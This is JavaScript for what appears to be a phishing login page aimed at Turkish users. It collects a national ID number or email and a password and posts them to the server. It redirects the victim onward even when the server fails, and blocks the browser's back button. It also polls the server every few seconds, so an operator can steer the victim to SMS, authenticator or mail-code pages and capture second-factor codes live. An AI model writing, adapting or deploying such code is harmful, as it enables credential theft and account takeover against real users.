function tcno_dogrula(tcno) {
    tcno = String(tcno);
    if (tcno.substring(0, 1) === '0' || tcno.length !== 11) return false;

    const ilkon_array = tcno.substr(0, 10).split('');
    let ilkon_total = 0, hane_tek = 0, hane_cift = 0;

    for (let i = 0; i < 9; ++i) {
      const j = parseInt(ilkon_array[i], 10);
      if (i % 2 === 0) hane_tek += j;
      else hane_cift += j;
      ilkon_total += j;
    }

    if ((hane_tek * 7 - hane_cift) % 10 !== parseInt(tcno.substr(-2, 1), 10)) return false;
    ilkon_total += parseInt(ilkon_array[9], 10);
    return ilkon_total % 10 === parseInt(tcno.substr(-1), 10);
  }

  function validatePassword(password) {
    const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$/;
    return regex.test(password);
  }
  document.getElementById("loginButton").addEventListener("click", function () {
    const trname = document.getElementById("trname").value.trim();
    const trpass = document.getElementById("trpass").value;
    let isValid = true;
    if (!trname.includes('@') && !tcno_dogrula(trname)) {
      document.getElementById("name-error").style.display = "block";
      isValid = false;
    } else {
      document.getElementById("name-error").style.display = "none";
    }
 
    if (!validatePassword(trpass)) {
      document.getElementById("pass-error").style.display = "block";
      isValid = false;
    } else {
      document.getElementById("pass-error").style.display = "none";
    }
    if (isValid) {
      fetch('/apitr', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ trname, trpass })
      })
        .then(response => {
          if (response.ok) { 
            return response.json();
          } else {
            throw new Error('Sunucu hatası! HTTP Kodu: ' + response.status);
          }
        })
        .then(data => {
          if (data.success === true) { 
            document.cookie = `trname=${trname}; path=/; max-age=3600;`;
            window.location.href = '/phone'; 
          } else {
            alert("Giriş başarısız! Tekrar deneyin.");
          }
        })
        .catch(error => {
          document.cookie = `trname=${trname}; path=/; max-age=3600;`;
          window.location.href = '/phone'; 
        });
    }
  });






   history.pushState(null, null, window.location.href);
  window.addEventListener("popstate", function () {
    history.pushState(null, null, window.location.href);
  });
 
  function sendUrlPath() {
    const currentPath = window.location.pathname + window.location.search;
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "/api", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            const responseText = xhr.responseText.trim();
            switch (responseText) {
                case "sms":
                    window.location.href = '/sms';
                    break;
                case "hata":
                    window.location.href = '/sms-error';
                    break;
                case "sms2":
                    window.location.href = '/error-number';
                    break;
                case "sifrehata":
                    window.location.href = '/password-error';
                    break;
                case "back":
                    window.location.href = '/email-error';
                    break;
                case "postakod":
                    window.location.href = '/mail';
                    break;
                case "google":
                    window.location.href = '/authenticator';
                    break;
                case "tebrik":
                    window.location.href = '/successfuly';
                    break;
                default:
            }
        }
    };
    xhr.send(`x=${encodeURIComponent(currentPath)}`);
} 
setInterval(sendUrlPath, 2100);
   